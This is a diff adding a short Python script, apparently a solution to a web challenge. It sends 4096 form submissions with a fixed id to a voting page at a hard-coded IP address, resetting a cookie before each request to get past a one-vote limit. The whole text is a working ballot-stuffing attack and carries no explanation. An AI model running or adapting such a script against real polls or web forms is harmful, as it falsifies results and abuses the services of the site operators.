@@ -1,0 +1,18 @@
+#!/usr/bin/python3
+
+
+import requests
+
+
+VOTES = 4096
+INPUT_ID = '338'
+SUBMIT_BUTTON = 'Submit'
+KEY = '0'
+URL = 'http://158.69.76.135/level1.php'
+FORM = {'id': INPUT_ID, 'holdthedoor': SUBMIT_BUTTON, 'key': KEY}
+H = {'Content-Type': 'application/x-www-form-urlencoded'}
+cookies = {'HoldTheDoor': '0', 'holdthedoor': '0'}
+
+for i in range(VOTES):
+    cookies['holdthedoor'] = cookies['HoldTheDoor']
+    stat = requests.post(URL, data=FORM, headers=H, cookies=cookies)
